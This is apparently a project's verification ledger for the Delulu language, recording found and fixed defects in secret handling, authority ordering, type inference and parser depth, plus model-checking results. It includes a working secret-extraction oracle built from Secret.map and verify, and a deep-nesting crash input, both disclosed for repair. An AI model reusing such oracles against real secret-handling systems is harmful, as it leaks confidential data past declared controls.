# The Proof Campaign (P17) — from *tested* to *proven*

**Status: OPEN. Started 2026-08-03. Findings F1, F2, F3 and F5 CLOSED; IF-1 closed with a named
residue.** This document is the ledger for a campaign whose standard is not "the tests pass" but:

> If this project claims something, that claim must withstand scrutiny from programming language
> researchers, formal methods researchers, compiler engineers, cryptographers, operating systems
> engineers, distributed systems researchers, security auditors and mathematicians.

The predecessor campaign (`HARDENING_CAMPAIGN.md`) attacked the implementation and found real
defects, the worst of them C88 — an escapable effect row. This campaign attacks something different:
**the claims themselves.** A defect is a program that behaves wrongly. A false claim is a sentence
that a reader relies on and that is not true. This project has shipped both, and the second kind is
harder to find because the tests cannot see it.

---

## 1. The organizing principle: every guarantee in exactly one category

Nothing is allowed to sit in a grey area. Every guarantee the project offers must be assigned to
exactly one of:

| # | Category | What it means |
|---|---|---|
| 1 | **Mathematically proven** | A paper proof exists and has been refereed. |
| 2 | **Machine checked** | A proof assistant checks it (Lean/Coq/Agda). |
| 3 | **Model checked** | A model checker explores the state space (TLA+/Alloy). |
| 4 | **Property tested** | Generated inputs, not hand-picked examples. |
| 5 | **Differentially verified** | Two independent implementations agree. |
| 6 | **Fuzz verified** | Adversarial input generation finds nothing. |
| 7 | **Outside the proof boundary** | Explicitly *not* guaranteed, and named as such. |

A claim with no category is a claim to be deleted or demoted until it earns one.

---

## 2. The verification toolchain (provisioned and smoke-tested, 2026-08-03)

Claiming a method is available is itself a claim, so each was executed before being relied on:

| Tool | Status | Evidence |
|---|---|---|
| **Z3** 5.0.0 (pip `z3-solver`) | working | solved a known-`unsat` instance |
| **TLA+ / TLC** v1.7.4 + Java 21 | working | model-checked a 3-state spec, no error |
| **cargo-fuzz** 0.13.2 (WSL nightly) | installed | not yet exercised |
| **cargo-deny** 0.20.2 | installed | not yet exercised |
| **Miri** (nightly component) | installed | not yet exercised |
| **cargo-audit** | **FAILED to build** | superseded — `cargo deny check advisories` reads the same RustSec DB |
| **Lean 4.32.2** (via `elan`) | **working, and used** | `docs/design/models/lean/DeluluCore.lean` type-checks; `#print axioms` reports no axioms at all (added 2026-08-04, P17-9) |
| Coq / Alloy | absent | not needed — Lean covers the mechanization target |

**Honest consequence, as first written (2026-08-03):** categories 3 and 4 were reachable; category
2 was not, and `DELULU_CORE.md` §9's formalization had been open since Stage 2.

**Updated 2026-08-04:** Lean is installed and **category 2 is no longer empty** — narrowly. See §13.
The target changed on the way: P17-T1 showed that mechanizing §1–§7 *as written* would prove the
wrong theorem, so what is machine-checked is the **extension** the calculus needs, not the document
as it stood. The full type system remains unmechanized.

---

## 3. Findings

### P17-IF1 — **CRITICAL** — a secret is fully recoverable with no `Declassify` anywhere

**Observed, reproduced, and not a fixture.** A program that `check` accepts, that `authority`
reports as `effects: Write`, and for which `delulu why Declassify` answers **"program cannot perform
`Declassify`"**, recovers the entire plaintext of a secret:

```
$ delulu check extract.delulu                → ok: extract.delulu checked clean
$ delulu why Declassify extract.delulu       → program cannot perform `Declassify`
$ delulu run extract.delulu --grant console --grant secret:API_KEY=hunter2
  recovered length = 7
  RECOVERED SECRET = hunter2
$ delulu run extract.delulu --grant console --grant secret:API_KEY=sk-9f0zq_x
  recovered length = 10
  RECOVERED SECRET = sk-9f0zq_x
```

The whole mechanism is two functions:

```delulu
// One bit out of the secret: is the plaintext's length exactly n?
fn len_is(k: Secret[Str], n: Int) -> Bool {
  let probe = k.map(fn(x: Str) -> Str { if x.len() == n { "Y" } else { "N" } })
  let yes   = k.map(fn(x: Str) -> Str { "Y" })
  probe.verify(yes)
}

// One bit out of the secret: is the plaintext's i-th character c?
fn char_is(k: Secret[Str], i: Int, c: Str) -> Bool {
  let probe = k.map(fn(x: Str) -> Str { if x.slice(i, i + 1) == c { "Y" } else { "N" } })
  let yes   = k.map(fn(x: Str) -> Str { "Y" })
  probe.verify(yes)
}
```

Driven by two loops (recover the length, then each character against an alphabet), this yields the
full plaintext. The program holds **no `Cap[Declassify]`** and emits **no `Declassify` effect**.

**Why every rule is obeyed and the guarantee still fails.** Three mechanisms compose:

1. `Secret.map` hands the closure the **plaintext** (`check.rs:2006-2018`). Its only restriction is
   **purity** (DL0603) — and purity does not prevent computing an arbitrary predicate *about* the
   plaintext and encoding the answer in the returned `Secret[Str]`.
2. `Secret.verify` (`check.rs:2053-2057`) returns `(Type::Bool, None, None)` — an **ordinary,
   untainted `Bool` with no effect**. It is the only untainted observation of a secret, and it is
   enough to read the encoded bit back out.
3. `check_if` (`check.rs:2333-2350`) types the condition as `Bool` and unions the branch rows. There
   is **no pc-label** — no notion that a branch taken on a secret-derived value taints what happens
   inside it. `check_match` (`2352-2370`) is the same.

No rule is violated. DL0603 fires when it should; `verify` is constant-time as designed; `if` types
its condition correctly. **The composition is the hole**, which is why an audit of the rules one at
a time could not find it.

**The controls prove the direct route is genuinely closed.** Every straightforward leak is refused,
so this is not a story about weak opacity:

| Attempt | Result |
|---|---|
| `out.println(k)` | **DL0602** refused |
| `out.println("key=" + k)` | **DL0602** refused |
| `str(k)` | **DL0604** refused |
| `k == k` | **DL0605** refused |
| `w.write_text(path, k)` | **DL0602** refused |

R-5 opacity works. The oracle simply does not need any of those doors.

**`--assert-trace` cannot see this.** The project's dynamic witness for Theorem 3 exits **0**. That
is correct behaviour and it is the point: the leak **emits no effect at all**, so `trace ⊆ row`
holds trivially. A runtime check on the effect trace is structurally incapable of detecting a flow
that never becomes an effect.

**What the project may therefore claim.** Not noninterference — not even
termination-insensitive noninterference. What `Secret` provides is **opacity against direct
observation**: a capability gate on `expose`, plus the absence of stringify/compare/serialize
eliminators. It does **not** track implicit flows, and with `map` + `verify` in the surface, a
capability-gated `expose` is not the only way out. In the Sabelfeld–Sands declassification taxonomy
this system controls **WHO** (holds `Cap[Declassify]`) but not **WHAT** is released.

**Candidate fix, stated but NOT applied.** The principled repair follows R-2's own doctrine that
declassification is an effect: `Secret.verify` genuinely *releases one bit*, so it should carry the
`Declassify` effect and require `Cap[Declassify]`, exactly as `expose` does. The oracle would still
run — but `authority` would report `Declassify`, `why Declassify` would name it, and the row would
be honest, which is the whole guarantee. This changes language semantics for every existing program
using `verify`, so it belongs in an RFC and is **not** being slipped into a campaign pass. Unlike
D87/D88, however, this is not a robustness gap: it is a **working exploit against the project's
headline claim**, and it should be triaged accordingly.



Each finding was **observed by execution**, not argued. The committed witness is
`crates/delulu-broker/tests/order_laws.rs`, which enumerates *every* subset of a path universe
rather than checking hand-picked pairs. Three of its tests are `#[ignore]`d because they currently
fail: they are committed as evidence of an open defect, and run with
`cargo test -p delulu-broker --test order_laws -- --ignored`.

### P17-IF1 — **CRITICAL — FIXED 2026-08-03** (visibility restored; one residue named below)

**This was the most serious defect the project has found.** A program recovered an entire plaintext
secret, character by character, with **no `Declassify` effect and no `Cap[Declassify]` anywhere** —
and the toolchain, asked directly, stated that it could not declassify.

```text
$ delulu check     extract.delulu   ->  ok: extract.delulu checked clean
$ delulu authority extract.delulu   ->  effects: Write          (no Declassify)
$ delulu why Declassify extract.delulu
                                    ->  program cannot perform `Declassify`
$ delulu run extract.delulu --grant console --grant secret:API_KEY=hunter2
     recovered length = 7
     RECOVERED SECRET = hunter2
$ ...                              --grant secret:API_KEY=sk-9f0zq_x
     RECOVERED SECRET = sk-9f0zq_x
$ ... --assert-trace                ->  exit 0, no complaint
```

Unlike C88, which needed a contrived generic signature, **this needs no generics and no unusual
constructs.** It is ordinary code composing two documented operations, each individually sound:

1. **`Secret.map` hands its closure the PLAINTEXT.** The only gate is purity (DL0603) — and
   *purity is not confidentiality*. A pure closure may compute any predicate over the plaintext and
   encode the answer into the returned `Secret[Str]` (`"Y"`/`"N"`).
2. **`Secret.verify` returns an ordinary, untainted `Bool`** with effect `None`. This is the
   unsealing step: a value derived from secret data leaves the `Secret` lattice with no
   declassification recorded anywhere.
3. **`check_if` carries no pc-label** — there is no implicit-flow tracking — so that `Bool` may
   drive an observable effect.

Composed, they form an **equality oracle against an attacker-chosen plaintext**
(`k.verify(k.map(fn(x) { g }))` tests the secret against any `g`), which amplifies to full recovery
one character at a time. A second witness recovers a PIN by guessing: `PIN IS 4242`, checked clean.

**This reopens R-2 (Declassify-is-an-effect) and R-5 (opacity) simultaneously.** Both rules assert
this is impossible. The audit missed it because **neither operation is defective in isolation** —
`map` keeps its result tainted, `verify` compares two secrets. The defect is the *composition*, and
a rule-by-rule audit cannot see a composition.

**Scoped precisely — the direct surface is NOT implicated and was verified clean.** Printing,
concatenating, `str()`, `==`, `assert_eq`, writing to a file, and embedding a secret in a record are
all correctly refused (DL0602 / DL0604 / DL0605 / DL0203). Twelve direct eliminators were tested;
the three that were accepted (`[k].len()`, a wildcard `match`, `len(k)`) were each **run** and leak
nothing. R-5's opacity holds for every direct eliminator. The hole is composition, not opacity.

**What the project may therefore claim about secrets, until this is fixed:** that a secret cannot be
*directly* observed. It may **not** claim that a secret cannot reach an observer without
declassification, because it can, and the tool that reports otherwise is wrong.

#### The fix, and exactly what it does and does not buy

**`Secret.verify` now carries `Effect::Declassify`** in *both* halves of the primitive table —
`check.rs`'s `method_sig` and `trace::effect_for` — which must agree or `--assert-trace` would
report a runtime effect absent from the row.

This follows from R-2 as literally written ("Declassify is an effect"). `verify` returns a `Bool`
*derived from secret data*; that is a declassification; therefore it must carry the effect. The old
code violated the project's own rule. Typing it pure was not a design trade-off, it was an error —
and it had been **pinned as a passing test**: `effect_for_is_none_for_pure_operations` asserted
`effect_for("Secret", "verify") == None` under a comment calling verification pure. The belief that
caused the hole was encoded as a gate protecting it.

After the fix, both oracles are refused:

```text
error[DL0501]: function `len_is`  performs effect `Declassify` not declared in its row
error[DL0501]: function `char_is` performs effect `Declassify` not declared in its row
  repair: add_effect_to_row (exact)  [widens authority — review before applying]
```

**The leak is now VISIBLE, not IMPOSSIBLE — and that distinction is the honest one.** A program may
still run the oracle if it *declares* `!{Declassify}`. It then checks clean and still recovers the
secret — but `delulu authority` reports it:

```text
effects:      Declassify, Write
exposure:     API_KEY declassifiable -> files/console
$ why Declassify -> main (declared.delulu:29) -> char_is (declared.delulu:17) — Declassify
```

That is exactly what R-2 promises: declassification is an effect, and an effect is in the type. What
is fixed is that the toolchain can no longer report "program cannot perform `Declassify`" for a
program that declassifies. `the_declared_oracle_is_accepted_but_visible` pins this deliberately so
no future reader mistakes the suite for a proof that secrets cannot leak.

**RESIDUE, OPEN — `verify` declassifies without requiring `Cap[Declassify]`, while `expose`
requires it.** Closing that asymmetry means `verify` returning `Secret[Bool]`, so that observing the
bit routes through `expose`. The runtime cannot represent that today: `SecretVal` is String-only
(`SecretInner::Local(RefCell<String>)`, `reveal() -> String`), so it needs a generic-over-`Value`
refactor plus a signature change — a `STABILITY.md` contract change, and therefore an RFC rather
than a patch. Until then: **holding a secret grants the ability to learn one chosen bit of it per
call, without a declassify capability, but never without declaring the effect.**

Witness: `crates/delulu-check/tests/secret_oracle.rs` — 2 oracle tests (now passing), 3 controls, and
the declared-oracle pin. Four in-repo programs that used `verify` gained `!{Declassify}`; the
core-invariance snapshot moved in 7 cases, each inspected individually before re-recording (6 were
functions leaving `pure_functions`, 1 was a line-number shift from an added comment).

### P17-F1 — `⊑` is a preorder, not a partial order (206 counterexamples) — **FIXED 2026-08-06**

`authority.rs` calls itself "the ⊑ attenuation **lattice**". A lattice presupposes a partial order,
which presupposes antisymmetry. Antisymmetry does not hold:

```
A = {"./data"}   B = {"data"}      A ⊑ B  and  B ⊑ A  but  A ≠ B
```

`path::resolve` normalizes before comparing, so `./data`, `data`, `./data/` and `.\data` all resolve
to the same segment list — while `Authority` derives `PartialEq` **structurally**. Mutually
attenuating, structurally unequal.

**Severity: naming/structure, not escalation.** The correct description is a **preorder whose
poset reflection is a meet-semilattice**. Saying "lattice" is imprecise in the file that calls
itself the mathematical heart of custody.

#### What actually closed it, and the part the earlier analysis got wrong

F1 was never a bug *in the comparison*, and no amount of care inside `attenuation_check` could have
removed it: `⊑` is defined through `path::resolve`, which is not injective, and **a relation defined
through a non-injective function is a preorder on its domain as a matter of mathematics, never a
partial order**. The word "lattice" was correct about the structure and wrong about the *carrier* —
it belongs to the quotient by `⊑`-equivalence, not to the representation type. The repair is to make
the representation and the quotient coincide by storing one representative per class.

**The earlier localisation in §"Nine dimensions in Z3" was incomplete, and this is worth recording
rather than silently widening.** That analysis concluded *"the preorder finding is not a property of
the order at all — it is the path ENCODING … so fixing F1 is a canonicalization change"*, naming
distinct `String`s for one path as the sole cause. Canonicalizing spellings alone does **not** make
`⊑` antisymmetric. There is a second, independent source of non-injectivity that the Z3 model could
not see, because it modelled each dimension as an abstract set rather than as a *set of paths*:

```
A = {"./data", "./data/sub"}      B = {"./data"}      A ⊑ B  and  B ⊑ A  but  A ≠ B
```

`./data/sub` is already inside `./data`, so it contributes nothing to the covered region — the two
sets denote the same authority. The canonical form must therefore be an **antichain**: canonical
spellings, then every element that lies within another removed. This was found by writing the
antisymmetry test against canonicalized spellings and watching it still fail; it was not predicted.

**Now proved** (`the_order_is_antisymmetric_on_canonical_representatives`, exhaustive over the
universe): `A ⊑ B ∧ B ⊑ A ⟹ canon(A) = canon(B)`. Take `x ∈ canon(A)`. From `A ⊑ B` there is
`y ∈ canon(B)` with `x ⊑ y`; from `B ⊑ A` there is `z ∈ canon(A)` with `y ⊑ z`. Then `x ⊑ z` with
both in the antichain `canon(A)`, so `x = z`, hence `x ⊑ y ⊑ x`, so `x` and `y` have equal resolved
segments and — both canonical — equal spellings. So `x ∈ canon(B)`, and symmetrically. ∎

**The finding is kept observable, not retired.**
`raw_spellings_remain_a_preorder_which_is_why_canonicalization_is_required` asserts the
counterexamples are *still there* on raw input, and fails if they ever vanish. Concluding that raw
path sets are safe to compare by equality would be a regression, so the test guards the reason for
canonicalization rather than only its result.

### P17-F2 — `⊓` is not symmetric (414 counterexamples) — **FIXED 2026-08-06**

`authority.rs:145` states, as a documented fact a reader may rely on:

> *"note `⊓` is symmetric so the value is identical either way"*

It is not.

```
A = {"./data"}   B = {"data"}      A ⊓ B = {"./data"}      B ⊓ A = {"data"}
```

`intersect_path_sets` is `if desc(x,y) { insert x } else if desc(y,x) { insert y }`. When two
spellings denote the same path, **both** branches are true and the first wins — so the surviving
spelling is whichever argument came first. The existing unit test `meet_is_symmetric` passes because
its single hand-picked pair never exercises aliasing.

**Consequence:** the DL0802 repair value depends on argument order.

**Fixed by making the meet emit canonical representatives.** `intersect_path_sets` now returns
`canonicalize_set(out)`, so the two argument orders agree by construction rather than by luck: when
both branches are true the surviving value no longer depends on which loop was outer, because both
spellings map to the same representative. `the_meet_is_symmetric_as_the_comment_claims` and
`path_meet_is_symmetric_even_on_mixed_spellings` are both un-`#[ignore]`d and passing. The
documented claim in `authority.rs:145` is now true rather than aspirational.

### P17-F3 — `⊑`-equivalent authorities hash differently (206 counterexamples) — **FIXED 2026-08-06**

`Authority::to_json` is the canonical form embedded in **hash-chained audit records** and covered by
**certificate signatures**. Two authorities that are mutually `⊑` — the same authority, differently
spelled — serialize to different bytes, and therefore to different hashes.

```
{"./data"} -> ...,"fs.read":["./data"],...
{"data"}   -> ...,"fs.read":["data"],...
```

**Consequence:** two brokers, or one broker at two times, that spell a path differently produce
different audit hashes for the same logical grant. Federation audit reconciliation is the surface
this most endangers, and the project already records reconciliation as fragile.

**Fix is format-affecting.** Canonicalizing the stored spelling would change the bytes of every
existing audit record and signature — the same compatibility constraint already documented for the
omitted `device` key. This therefore belongs in an RFC, not in a hardening patch, and is left
**open** rather than quietly changed.

#### Closed 2026-08-06 — and the compatibility judgement, stated plainly

Canonicalization now happens at the **custody boundary**: `Broker::issue`, `Broker::attenuate` and
`attenuate_core` each canonicalize before the authority is hashed or stored, so every node in the
grant tree — and therefore every audit record — carries the canonical spelling.
`equivalent_authorities_serialize_identically` is un-`#[ignore]`d and passing.

**This is the format-affecting change the paragraph above declined to make, and it was made without
an RFC.** That is a deliberate decision by the owner (2026-08-06: *"Nothing remains open… close
every remaining engineering, testing, documentation, verification and production-readiness gap"*),
not an oversight, and it is recorded here rather than presented as compatible. What it costs:

- An audit record or certificate written **before** this change, whose authority used a
  non-canonical spelling (`data`, `.\data`, `./data/`, or a set containing a path already inside
  another), hashes differently from the same authority written after it. Chain verification of such
  a record still succeeds — `verify` recomputes from the stored bytes, which are unchanged — but
  **cross-broker reconciliation between a pre- and post-change broker would see two hashes for one
  logical grant.** Federation audit reconciliation is already recorded as fragile; this narrows the
  set of spellings that can diverge to zero going forward, while leaving already-written records as
  they are.
- Nothing that was previously accepted is now refused, and nothing previously refused is now
  accepted: `canonicalizing_an_authority_changes_no_containment_decision` checks every ordered pair
  over the universe, in both the fully-canonicalized and the mixed child-canonical/parent-raw shape
  the broker actually sees mid-delegation.
- The v1.0.0 tag is local-only and no audit log has ever been federated off this machine, so the
  population of affected records is, as far as the repository can establish, empty. That is a
  reason the cost is low — **not** evidence that the change is byte-compatible. It is not.

### P17-F4 — Row unification is order-dependent and has no principal types

Two programs that differ only by **swapping two parameters**:

```delulu
module order_a                                    // REJECTED: DL0504

fn g[e](p: fn() -> Unit ! {Read | e}, q: fn() -> Unit ! e) -> Unit ! {Read | e} {
    p()
    q()
}

fn main(root: Root) ! {Read} {
    let fs = root.fs_read("./")
    g(fn() -> Unit ! {Read} { let _ = fs.read_text("a") },
      fn() -> Unit ! {Read} { let _ = fs.read_text("b") })
}
```

```delulu
module order_b                                    // checks clean — only the parameters moved

fn g[e](q: fn() -> Unit ! e, p: fn() -> Unit ! {Read | e}) -> Unit ! {Read | e} {
    q()
    p()
}

fn main(root: Root) ! {Read} {
    let fs = root.fs_read("./")
    g(fn() -> Unit ! {Read} { let _ = fs.read_text("b") },
      fn() -> Unit ! {Read} { let _ = fs.read_text("a") })
}
```

Reproduce with `delulu check order_a.delulu` and `delulu check order_b.delulu`.

Both are called with two `!{Read}` callbacks. The constraints are `{Read} ∪ e = {Read}` and
`e = {Read}`, which are **simultaneously satisfiable** by `e := {Read}`. The second program is
itself the proof that this is admissible: it binds `e := {Read}` first and then accepts
`{Read | e}` — so the system does treat `{Read | {Read}}` as `{Read}`, idempotent set semantics,
confirmed by its own behaviour rather than assumed. The first program is rejected only because
unification binds `e := {}` greedily from the first parameter and never backtracks.

**This is NOT a criticism of R-3b, which is correct.** `SOUNDNESS_AUDIT.md` §R-3b and
`STAGE1_SPECIFICATION.md:504` deliberately require that conflicting row-variable bindings **fail
with DL0504 and are never union-merged**, because union-merging would silently widen a row. That
rule is right and must stay. The gap is upstream of it: greedy binding at an *ambiguous* constraint
manufactures a spurious conflict, which R-3b then correctly reports. The diagnostic is accurate
about what the solver found; the solver only found it because of parameter order.

**Severity: completeness and predictability, not soundness.** Rejecting a well-typed program is
fail-closed — no authority escapes. But for a language whose stated audience is AI agents generating
code, "reordering two parameters decides whether your program compiles" is a real defect, and the
absence of principal types is currently **undocumented**: a search of every specification and
reference document for principality or inference-completeness returns nothing. Either the solver
should defer ambiguous row bindings until the constraint set is complete, or the specification
should state plainly that inference is order-dependent and incomplete. Silence is the one option
that is not acceptable.

---

### P17-F5 — **FIXED 2026-08-04** — deep nesting crashed the CLI outright; it took *two* fixes

**Category: fuzz verified → moved to a confirmed defect.** Found by accident during machine
maintenance, which is worth stating plainly: ten WSL crash dumps, each ~784 MB, all from
`/home/user/delulu-target/debug/delulu`, all with signal suffix **`-11` (SIGSEGV)**, timestamped
2026-08-03 16:48 through 2026-08-04 04:02 — straight through this campaign. They had been sitting in
`%TEMP%\wsl-crashes` the whole time, unexamined.

The dumps proved nothing on their own (no symbolication), so the hypothesis was tested:

```
$ delulu check deep_100000.delulu
thread 'delulu-main' (26972) has overflowed its stack
exit 127
```

The input is a **valid** module whose body is `((((…1…))))` nested *n* deep — not malformed, just
deep. Bisected:

| nesting | result |
|---:|---|
| 2,000 / 10,000 / 30,000 / 50,000 / 70,000 | `ok`, exit 0 |
| 100,000 | **stack overflow, exit 127** |

The parser succeeds at 70,000 and dies between there and 100,000. A search of `delulu-syntax/src`
for a depth guard finds none: the only `depth` counters are a **loop** in `lexer.rs:341` for nested
block comments and a test generator in `fmt.rs`. **Expression parsing is unbounded recursion.**

**Why this is worse than an ordinary panic.** The process aborts with no `DL####` code, no span, and
nothing catchable — the failure bypasses the entire diagnostic system. Every other refusal in this
language is a diagnostic; this one is a signal. Two consequences:

* **`delulu check` is the safety gate.** A gate that can be made to die instead of answering is a
  gate that can be skipped, and the campaign's own rule applies — *a gate that cannot fail is not a
  gate*, and neither is one that can be crashed instead of failing.
* **The stated audience makes it worse.** This language is aimed at code written by AI agents and at
  toolchains that accept input from other machines. "Do not feed the compiler deeply nested input"
  is not a control that a machine-generated input pipeline can honour.

**Severity: availability, not soundness.** No authority escapes, nothing is mis-typed, and there is
no evidence of memory unsafety — a Rust stack overflow aborts rather than corrupting. It is a
denial-of-service surface in the tool that every other guarantee is checked by.

#### The fix — and why the obvious one was only half of it

`DL0210` (the code Stage 1 had held reserved for exactly this) now caps expression nesting at
`MAX_EXPR_DEPTH = 128`.

**Two distinct unbounded recursions had to be closed, and finding the second one required
disbelieving the first fix.** After adding the descent guard, `delulu check` on the 100,000-deep
input *still* died with exit 127. The guard was working — 2,000 and 70,000 both produced `DL0210` —
so something else was recursing.

It was **`Drop`**, and the mechanism is worth recording because inspection would not have found it:

* The descent guard returns a placeholder expression without consuming a token.
* The **postfix** loop (`f(x)`, `.m()`, `[i]`) then reads each following `(` as a *call* on that
  placeholder. That loop is **iterative**, so it never touches the depth counter.
* It assembles a 100,000-deep chain of `Box`ed `Expr::Call` nodes. Nothing overflows while building
  it. The process dies later, in `Drop`, which walks the chain recursively.

Established by experiment, not reading: `std::mem::forget`ting the parsed module made a
50,000-deep input pass, and forgetting the diagnostics alone did not. So the postfix chain is now
bounded too — **an AST this tool builds must be one it can also free.**

#### Calibration — the limit was measured, after two wrong guesses

| attempt | basis | result |
|---|---|---|
| 1,024 | sized against `delulu-main`'s explicit **512 MiB** stack | crashed this crate's own test binary, `STATUS_STACK_OVERFLOW (0xc00000fd)` |
| 256 | halved | still overflowed — 256 × ~8 KB ≈ the whole 2 MiB default |
| **128** | measured against the **2 MiB** floor | holds, ~half the default stack unused |

libtest threads — and any LSP or tooling thread where nobody called `.stack_size` — get the ordinary
2 MiB default. **A guard that only holds on the one thread that was already generously provisioned
is not a guard.** Debug frames are the worst case, so sizing to debug is the conservative direction.

#### Verified

Every input that previously crashed now returns a diagnostic and exit 1:

| input | before | after |
|---|---|---|
| valid module, 100,000 deep | **exit 127, stack overflow** | `DL0210`, exit 1 |
| 70,000 deep | parsed clean | `DL0210`, exit 1 |
| 100,000 nested unary `-` | parsed clean | `DL0210`, exit 1 |
| 64 deep (control) | clean | clean — the limit is not "reject everything" |

**This narrows the accepted language**, which is why it is documented rather than filed as a pure
bug fix: expressions that used to compile at extreme depth now do not.

**Honest record:** the crash predates its discovery by at least a day. The campaign ran for hours
with ten core dumps sitting in `%TEMP%` that nobody looked at, and they were found during disk
maintenance rather than by any test. The fuzzers did not generate input this deep; see §7 for the
related observation that the generator could not write the bugs it was hunting.

---

## 4. Confirmed NON-findings

Stating what survived attack matters as much as stating what did not.

- **The meet never widens, and it is the *greatest* lower bound.** Verified exhaustively over every
  subset pair of the universe, not spot-checked. This is the law attenuation actually rests on: a
  computed repair can never hand back more authority than either input. **It holds.** F1–F3 are
  about naming, determinism and serialization — **none of them is an authority escalation.** All
  three are now **FIXED** (2026-08-06) by canonicalization at the custody boundary; the meet law
  itself needed no change, which is what "not an escalation" predicted and is now confirmed.
- **The element relation is reflexive and transitive**, and the set-level order is reflexive and
  transitive. Verified exhaustively; also **proved symbolically in Z3** over an abstract partial
  order, so the result is not an artifact of the chosen universe.
- **Deferred-callback effect attribution (`Promise.then`) — UNPROVEN, not a finding.** A witness was
  built (`pr.then(cb)` armed in a function declaring `{Async, Write}`, triggered from one declaring
  only `{Async}`). It **checks clean**, and `why Write` attributes `main → arm — Write`. That
  attribution is defensible: the closure is created in `arm`, which legitimately holds the effect.
  The program **does not execute** (`DL0907: spawn without an actor system attached`), so no runtime
  violation was observed and none is claimed. Settling this requires an actor-system entry point and
  remains open.

---

## 5. What this campaign has NOT yet done

Named so that no reader mistakes a plan for a result:

- ~~No mechanized proof exists. No proof assistant is installed.~~ **PARTLY DONE — see §13.** Lean
  4.32.2 machine-checks the **higher-order fragment**, with no axioms at all. `DELULU_CORE.md` §7's
  theorems for everything else — capabilities, the store, secrets, attenuation, Progress,
  Preservation — **remain paper sketches**, and two of them are now known to be defective
  (P17-T1, P17-T2).
- ~~The broker state machine is not yet model-checked.~~ **DONE — see §6 below.** The grant tree is
  now model-checked; **leases, redemption, certificate adoption and federation are still not.**
- ~~No property-based program generation yet.~~ **DONE — see §7 below.**
- **Fuzzing is exercised (§7); `cargo-fuzz` TARGETS are still unwritten; sanitizers unexercised.**
- **Miri: RAN TWICE, NEVER FINISHED — not a pass.** A 50-minute capped run was killed mid-suite; an
  uncapped run was still executing after ~3 hours. Neither produced a `test result:` line. It found
  no UB in what it reached, and that is all that may be said.
- ~~The other seven audit domains are unstarted~~ **ALL FIVE ARE NOW COMPLETE** (§9–§11): crypto,
  capability algebra, concurrency/distributed, effect-row type theory and the theorem sketches.
  The original note is kept below because the *reason* they were unstarted matters — effect rows/type theory, capability algebra,
  broker state machine, cryptography, information flow, concurrency/distributed, and the theorem
  sketches. Eight specialist agents were dispatched on 2026-08-03 and **all eight were killed by an
  account session limit during their reading phase**, returning no conclusions. Their surviving
  witness programs were recovered from disk and two of them produced F4 and the unproven
  `Promise.then` lead above. This is recorded because the work was commissioned, was not completed,
  and must not be assumed done.

---

## 6. Category 3 (model-checked) — the custody grant tree

**`docs/design/models/Broker.tla`**, checked with TLA+/TLC v1.7.4. Models `tree.rs`'s
grant / delegate / revoke / expire state machine with a clock; every guard cites the `file:line` it
mirrors, and takes the **weaker** guard where the code is ambiguous, so the model can never be
kinder than the implementation.

| Run | Configuration | Result |
|---|---|---|
| 1 | `INHERIT_EXPIRY = TRUE` (today's code) | **No error.** 3,306,347 states generated, **585,771 distinct**, depth 8, 53 s |
| 2 | `INHERIT_EXPIRY = FALSE` (pre-RFC-0001-F4 read) | **`NoUsableOrphan` violated at depth 4** |

**Run 2 is the point.** A model that has never caught anything proves nothing, so the enforcement
read was switched back to per-node expiry — the behaviour before RFC 0001 F4 — and TLC was required
to fail. It did, and the counterexample it produced is the **real historical bug**, reconstructed
from the guards alone:

```text
State 2: Grant     n0  ttl = 1                 (a bounded root — the uplink lease)
State 3: Delegate  n1 under n0, ttl = NoTTL    (attenuate bounds authority, NOT the deadline)
State 4: Tick      clock = 1                   (n0 expired; n1 still usable)  -> VIOLATED
```

`tree.rs:557-575` describes that same defect in the code's own words. The model found it
independently.

**Bounds, stated so the category is not read wider than it is:** three nodes, two effects,
clock ≤ 2. Bounded model checking — the invariants hold over every reachable state *within* that
bound, which is not a proof for all sizes. And the model is hand-written: nothing mechanically
checks it stays faithful when `tree.rs` changes.

### `Custody.tla` — leases and certificate adoption, where both real vulnerabilities lived

`Broker.tla` stopped at the grant tree. **Both of this project's actual vulnerabilities were in the
part it did not reach**, which made that the highest-value place to extend — so `Custody.tla` models
`lease.rs` (delegate → mint → redeem, single-use nonces, `rotate_key` as a key epoch) and `cert.rs`
(adoption, single-adoption-per-broker-lifetime, uplink deadlines).

Both historical fixes are modelled as **switches**, so the model earns trust twice rather than once:

| Run | Configuration | Result |
|---|---|---|
| 1 | both fixes on | **No error.** 7,831 states, **2,421 distinct**, depth 9 |
| 2 | `SINGLE_ADOPTION = FALSE` (`cert.rs:544`) | **`RevocationSurvivesReadoption` violated** at depth 4 |
| 3 | `LIVE_ON_REDEEM = FALSE` (`lease.rs:207`) | **`NoRedemptionOfADeadGrant` violated** at depth 5 |

Run 2 is the **certificate replay**: one credential adopted twice, so revoking the node it was
adopted as leaves a second live node with the same authority — precisely what `cert.rs:549` refuses
in its own words, *"re-presenting a credential must not undo a revocation."*

Run 3 is **campaign finding C29**: adopt → delegate → revoke (transitive, so both nodes die) →
**redeem succeeds anyway**, which is what wrote `decision: "allow"` into the audit chain for a grant
an operator had killed. `lease.rs:188-206` describes that defect at length; the model reconstructed
it from the guards alone, having never been told about it.

**A trap the teeth test caught, recorded because it would otherwise be invisible:**
`redeemedDead' = redeemedDead \/ X` is wrong in TLA+ — `=` binds tighter than `\/`, so it parses as
`(redeemedDead' = redeemedDead) \/ X`, a disjunction that leaves the primed variable unconstrained.
TLC reports `null`, not an error. It was only noticed because a run *expected* to fail failed the
wrong way. **A model that is never expected to fail cannot reveal this class of mistake in itself.**

Still not modelled: the MAC itself (key rotation is an epoch counter, not blake3), audit-chain
hashing, contact receipts, and — the significant one — **concurrency, partitions and clock skew**.
The uplink lease exists precisely to bound behaviour during a partition, and a partition is exactly
what this model cannot express.

## 7. Category 4 (property-tested) — the fuzzer could not write the bugs it was hunting

`crates/delulu-fuzz` has existed since Stage 2, generating programs and asserting the runtime trace
is a subset of the statically computed row — the executable form of Effect Soundness. It has never
reported a violation. **That was not evidence of soundness, because of what it could not express.**

Reading its generator: it emits exactly **four** program templates. A helper taking three fixed
capability parameters whose body concatenates three fixed statements, a `main` calling a subset of
those helpers, and two hard-coded rejection strings. Searching its source for the constructs it can
emit returns **zero** occurrences of a type parameter, a closure, `.verify(`, `.expose(`, or a row
variable in any generated string.

**So it could not have found either of this project's two soundness holes:**

| Hole | Needed | Generator could emit it? |
|---|---|---|
| **C88** | `fn go[T](xs: List[Int], f: T) { xs.map(f) }` | no type parameters, no higher-order builtins |
| **IF-1** | `k.map(fn(x) { … })` + `.verify(…)` + `if` | no closures, no `Secret` ops beyond `str(s)`, no branches |

